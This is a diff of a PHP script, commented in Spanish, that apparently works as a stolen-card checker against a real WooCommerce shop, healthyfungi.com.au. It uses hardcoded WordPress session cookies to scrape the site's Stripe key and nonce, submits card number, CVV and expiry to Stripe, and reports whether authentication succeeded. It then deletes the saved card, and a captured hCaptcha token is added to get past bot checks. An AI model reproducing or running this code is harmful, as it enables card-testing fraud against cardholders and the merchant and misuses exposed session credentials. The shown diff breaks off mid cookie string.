@@ -2609,7 +2609,7 @@ for ($i = 0; $i < strlen($cc); $i += $longitud) {
     $parte = substr($cc, $i, $longitud);
     $partes[] = $parte;
 }
-
+$cc = implode('+', $partes)
 	
 //-----------------------------------------------------//
 $verify = substr($cc, 16, 1);
@@ -2638,6 +2638,7 @@ $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
 
 //sendPv($myid, 'error4..');
+
 $curl = curl_init();
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://healthyfungi.com.au/my-account/add-payment-method/',
@@ -2647,7 +2648,7 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => '__stripe_mid=553ec517-b27f-410d-844e-dac94ee43ac973a9b1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-25%2014%3A55%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-10-25%2014%3A55%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=jigotal473%7C1731078290%7CnA9vVsL3IXN2WMlAnE1skAcSbIkVlVWCthqHJDsm3Fr%7C71ed9c1387afc531579fdcc495d8d3350fe2b8166ddb49315e4bd24b73a95629; sbjs_session=pgs%3D22%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7C7cf3e7871efb13634e7094dac3694c8fbd343128b0365673a9e938aeebea5f7f; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua-platform: "Android"',
@@ -2655,11 +2656,10 @@ curl_setopt_array($curl, [
   ],
 ]);
 
+
+
 $response = curl_exec($curl);
 $err = curl_error($curl);
-
-curl_close($curl);
-
 
 // Extraer pk_live
 $patron_pk = '/"publishableKey":"([^"]*)"/';
@@ -2670,11 +2670,14 @@ $pk_live = $matches_pk[1];
 $patron_nonce = '/"createSetupIntentNonce":"([^"]*)"/';
 preg_match($patron_nonce, $response, $matches_nonce);
 $nonce = $matches_nonce[1];
-	
-$cc = implode('+', $partes);
+curl_close($curl);
+
+
+
+//echo "$pk_live\n";
+//echo "$nonce\n";
 
 $curl = curl_init();
-
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
   CURLOPT_RETURNTRANSFER => true,
@@ -2683,7 +2686,7 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Fc2c2f6daa2%3B+stripe-js-v3%2Fc2c2f6daa2%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhealthyfungi.com.au&time_on_page=39695&client_attribution_metadata%5Bclient_session_id%5D=c7c53e67-a039-45f0-b822-91b476f6001b&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=NA&muid=553ec517-b27f-410d-844e-dac94ee43ac973a9b1&sid=NA&key='.$pk_live.'&_stripe_account=acct_1PLz1dC08E2V4AsU',
+  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2F1a86f4d606%3B+stripe-js-v3%2F1a86f4d606%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhealthyfungi.com.au&time_on_page=28600&client_attribution_metadata%5Bclient_session_id%5D=4fc4657d-b5ce-496d-98e3-4cabe6bb1284&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=4485f0fe-2a44-46ca-8a18-6775167b89bcebfec0&muid=53e89807-84e5-4a98-a6e5-1f91e51883aa844aaf&sid=cc06746a-e59e-4944-b9a9-35894a6b552d4eb28c&key='.$pk_live.'&_stripe_account=acct_1PLz1dC08E2V4AsU&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiN0FxMGQydktRWll3cUZydkVDb1oyZ01zcXpYMUREdS8wY0VZRFFHdExhbnRkNEw1RlowLzMzS1BPMEZZaVFSRmhYLy96WWd5YzI0Y0RFWFpUa0hHUUVuSDlUYTZ3aTYxWTZoMjN1bTFUUE42SW54RldFb3laVzZhbnlKcVlJWWhJcFo2bVMvTDVhNHhpRnZJdmNKQ0g0enlVaDlENHVCQXNlRGI3MnNhSE45U0p5azRsRmQrMHd4dkJDc2tNTlNINHhwN1lDTzFFUkJFbmN1NXNEWGVLM05LaGU3RXZCS2h5R3pSdG9IdXl1VmtxenVvK1pqRHNlZHorNkpjdENmRXh2UzNkeGtpYU1paW5PTHJQbmZZVTh0RTJKR3JpWEJHZmZzK29MNUdQNDBGZjMranlXSG5adzNyaFR2ekM0QnVrYVoxNXowOTNUV1gwVmcyYjJuanZVTkxiaktSaXA2cW91VUFPb29nRzNnRUY4SHNqUzhMWEUrMmtBU3ZTMFVuMlAwZXl1WVM4YUt1KzZQVWdyUHkxZW9CbHdlMjFoL0tudzJTMGcvTXdDYVpSc1E1blhPK29qQUtKNzMzeWJPbmpHTGx2UkN3SEcwelo2NlpTc3JZU0w3SzdPV1ZnSHVFS3F1OVhpTDZmaFZnb0NQYzgyVExCblJ1Yko3cnNCYytmU0UxbWh5QzRSUEVnbFhyV2ZwelVCY3FHVXpObWt0ejJaa1VYRE5GNDNuZ01BOWwxc29WL3B1aHJGTTh5KzRBQ2dSM0pSQWtTNG5XVFErVVoyYVdVRTBJWVRsSjV2TTFHOUZ4azl3VTdnNHIyUDdiWnczQkRjaUw4WFQvQ3Jpbkp3enU1NEdrL1c5MDhieURmYjdOL2xwWlFrdlk5bjJuZkRBWm5GV0g3WHZRTzdUNTNCNURqQy9vOUlkRERybm9mK0RsZ1QxRVgxd2t5THVLNWgra0wwdE1teDgvR2dJc3VmZzJTNHlleWVUMS9ValZOMmhCSlZ5Y3VBR1MwcjBCNkxyU0tiZTVSQ0NrYVl0OGw4SFBOekh3OFFYbW5RM2d0dElWVlMxTWRSTnlqRm8yUVhpR0lBWnZwNVVDQlFDNGRWSmxPODd4OU5HeEdFcnRrdjAyQ1hqK2pKNkIrSlVzN0h4NmZSM2tYMGhYT1piTHNJQVVzWFBHSEVTOGZKNk9ZNXprUzRPcCtqZVN4Tk81cHE5OTltZGVaNVlFejJtRXY5TkFhNnFGTmVyaHQvbk5FVjc0aTZOY1dxeXZiT0piZ0V5NnhpNmdmYWlFQVVOT0hUSnRFNVBOSWxiQkRQOEh1SjMySWZnR2h1aFd4YllSSWcrTkp6WnVjc0dYY0VDUHMvaC8rN29oT0NLZlVFWTdZYXBIYWU4UUpMZ1dRZ2hKaWtIZTA0TC9FeG85YmU4QWdmWXliZy8wWElYKy9qSjFhT3ZIRDg3K1lZeWdOQXNDYXR4WVNZVW9WdzVUQXFjb1VJQ1hsZVA5SThrdUNJSUFNaG95OGdjc1paVWRZRlZ2eldyOG1kODgrelFIelhCYU5lZ0k0dWR3eENqRkYrdUxXYkhVd1RlTnlIWGxaM0JlMlpQYzArMWd2cWgwa0J0ZEZlTlk1a3hxQUZIUzFsZHlXY3d4QzdJczFyMVQ4R29ESHh5ODVZRFRGQjJxRy9DNW5zcFhzTmV5VThmcUdSN1NvZ2VaSEFBczcyc1p2cE45S0VycU5ldklUUDdUSzNaQi9JV2hTM01lZExLc2gvSWRBV2JLeVUwRVFObjlqSkRXNlNPSVRlV0prK2NWVTlWcHgxZHM5cEtYT3RieEdPUmlyaWRuSENXaktWZVcxSVpmdFVOZXZLSjMveW04b1dBOFJIWlh0TXQxQXFYWkwxa0dxMmhIcDN4akY3ZTFKay9kOEwvZWRlWDA1MWNkTEh5eDVwUEtSUFN3K3crSE5TN0tpdUJqQ1BxU0RBWXJ6ams1SWpkd0Q2RWlpMytvRitnK0YzRXBxQU1EUThtY2I3Rjg1MGlZMWswYTVZWnJSVzNRdk5wc05NQ1prNUNwcWcvU2dtU1puL09SNW9NZHI4aXZsM3FtZFdCMDNtTC9qbGlMV3NZc3dMZ1Z0UXlYMVVzbjRCVDBEZ3hUS3ZPNUdpbVV5WDFOYmx1TjFqaGxFaTU3NEpFSGNLNDRLSjZrcnJFWHVSbkEwOVd4dVB3bi8wZUhGNURHWTA0a1Bjc0JyRlFGSEkrVGtxYlJoTndJd1Ywd1FFYjFXTnV2My9lTjdiS1pSVFhzYmJFZUtXeE91clJ3OGJ4ZzRzRFdVN3hYL0QrSXZTZDFwTkE2VVRicjErK1Y4bWg5QWY5SW54Y08zRzFrOS82Szc0SmRveVhORmxXVlBuSGJwYlFlTDRBNU5Zc295Sm1aSFExeVpSYjh0MllrY1liUExKN25zNjhEblRyNnFDckV1VDUwamtnNTVHRnI3U3JjNDVjNFhlM2VBRDQ4U1YvMTdsTzltMVdCcXI1ejVYb2kvQjQrVEkya2xoaVNCOFFOUWhKZ284b2IwSEcvMGVCV3ZZREJVbFVRcTJ0R09tQkFtbVplZ1J5dEZMM0RJekdVWGxtd3M1eHk0ZGE2RnNydEJQa2w2Y0duUkI2eC9Ua1FlMzFsa040dGRZWktaMkIzU3N3a3pibVhLYll3ektUUUh1SnlxRXVmdjM2R0dsZWdqRlFxQ2l4S2tMRXNYRzF5MFR4S1pqVTYvcXBBdFVQZzM1UnVFT3ZLSTRkVjJUWT0iLCJleHAiOjE3MzEwOTUwMzcsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMzgwMmQ4ZGMiLCJwZCI6MCwiY2RhdGEiOiJYM1ZEN0hOMEJxTG5zQ3ZreUhLZmRQZHE0cmZDeU11K05oeGpzejBtMEp5ZXBPMXVNanBmK3E4elEwbkpwRFZtYnhPTDlzbThRaGsyZlZvb1I1cjFZeXQ1aVRTbWlsWUpyNmF3eW55dzZJVDlVU0owSTVrVzFnWkNrdy9vcDhMaTZ0dElFcnZ4dGJkTUhVTkVWamtNb3lyMExFbkFWSGRiWkRYSUQzYUd0TnpmUzNTQWpTU0s1ZU1mS3VUN056VVdyR1IxL1pUenR5SHErSTVFIn0.jU97WVh25hH7Qr30Fie7iDKvP1O3zZzC4MMAA0_48Do',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
     'Accept: application/json',
@@ -2694,6 +2697,8 @@ curl_setopt_array($curl, [
   ],
 ]);
 
+
+
 $response = curl_exec($curl);
 $err = curl_error($curl);
 $json = json_decode($response, true);
@@ -2701,8 +2706,13 @@ $id = $json["id"];
 curl_close($curl);
 
 
+//echo "ID $id\n";
+
+
+
 
 $curl = curl_init();
+
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://healthyfungi.com.au/wp-admin/admin-ajax.php',
   CURLOPT_RETURNTRANSFER => true,
@@ -2716,20 +2726,23 @@ curl_setopt_array($curl, [
     'wcpay-payment-method' => ''.$id.'',
     '_ajax_nonce' => ''.$nonce.'',
   ],
-  CURLOPT_COOKIE => 'wordpress_sec_febd530ada708d5093f883308bac36a7=jigotal473%7C1731078290%7CnA9vVsL3IXN2WMlAnE1skAcSbIkVlVWCthqHJDsm3Fr%7Cd76278ec6103004c7061337be34c8af58c822ced1a276b84fe7ded35f9dd9a32; __stripe_mid=553ec517-b27f-410d-844e-dac94ee43ac973a9b1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-25%2014%3A55%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-10-25%2014%3A55%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=jigotal473%7C1731078290%7CnA9vVsL3IXN2WMlAnE1skAcSbIkVlVWCthqHJDsm3Fr%7C71ed9c1387afc531579fdcc495d8d3350fe2b8166ddb49315e4bd24b73a95629; sbjs_session=pgs%3D23%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_COOKIE => 'wordpress_sec_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7Ce541956337674ea4cc613bf003c672f3ca4e87d5533a58c57e99372cf68a9c38; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7C7cf3e7871efb13634e7094dac3694c8fbd343128b0365673a9e938aeebea5f7f; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=53e89807-84e5-4a98-a6e5-1f91e51883aa844aaf; __stripe_sid=cc06746a-e59e-4944-b9a9-35894a6b552d4eb28c',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua-platform: "Android"',
+    'sec-ch-ua: "Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
+//    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryjQU0nO2GoQZEBYdk',
+    'accept-language: es-US,es;q=0.6',
     'origin: https://healthyfungi.com.au',
     'referer: https://healthyfungi.com.au/my-account/add-payment-method/',
   ],
 ]);
-	
+
 $response = curl_exec($curl);
 $err = curl_error($curl);
-$json = json_decode($response, true);
 curl_close($curl);
 
+	
 //------------------------------------------//
 //$message = $json['data']['error']['message'];
 $message = str_replace("Error: ", "", $json['data']['error']['message']);
@@ -2741,9 +2754,7 @@ curl_close($curl);
 if ($success === true && $status === "succeeded") {
     $respo = "3DS Authenticate Attempt Successful ✅";
 
-
 $curl = curl_init();
-
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://healthyfungi.com.au/my-account/payment-methods/',
   CURLOPT_RETURNTRANSFER => true,
@@ -2752,18 +2763,15 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => '__stripe_mid=553ec517-b27f-410d-844e-dac94ee43ac973a9b1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-25%2014%3A55%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-10-25%2014%3A55%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=jigotal473%7C1731078290%7CnA9vVsL3IXN2WMlAnE1skAcSbIkVlVWCthqHJDsm3Fr%7C71ed9c1387afc531579fdcc495d8d3350fe2b8166ddb49315e4bd24b73a95629; sbjs_session=pgs%3D23%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7C7cf3e7871efb13634e7094dac3694c8fbd343128b0365673a9e938aeebea5f7f; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=53e89807-84e5-4a98-a6e5-1f91e51883aa844aaf; __stripe_sid=cc06746a-e59e-4944-b9a9-35894a6b552d4eb28c',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
-    'accept-language: es-US,es;q=0.8',
+    'accept-language: es-US,es;q=0.6',
+    'sec-ch-ua: "Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
     'sec-ch-ua-platform: "Android"',
     'referer: https://healthyfungi.com.au/my-account/add-payment-method/',
   ],
 ]);
-
-$response = curl_exec($curl);
-$err = curl_error($curl);
-curl_close($curl);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
@@ -2773,9 +2781,9 @@ $url_nonce = $coincidencias[0];
 curl_close($curl);
 
 
+echo "$url_nonce\n";
 
 $curl = curl_init();
-
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://healthyfungi.com.au/my-account/delete-payment-method'.$url_nonce.'',
   CURLOPT_RETURNTRANSFER => true,
@@ -2784,11 +2792,12 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => '__stripe_mid=553ec517-b27f-410d-844e-dac94ee43ac973a9b1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-25%2014%3A55%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2024-10-25%2014%3A55%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=jigotal473%7C1731078290%7CnA9vVsL3IXN2WMlAnE1skAcSbIkVlVWCthqHJDsm3Fr%7C71ed9c1387afc531579fdcc495d8d3350fe2b8166ddb49315e4bd24b73a95629; 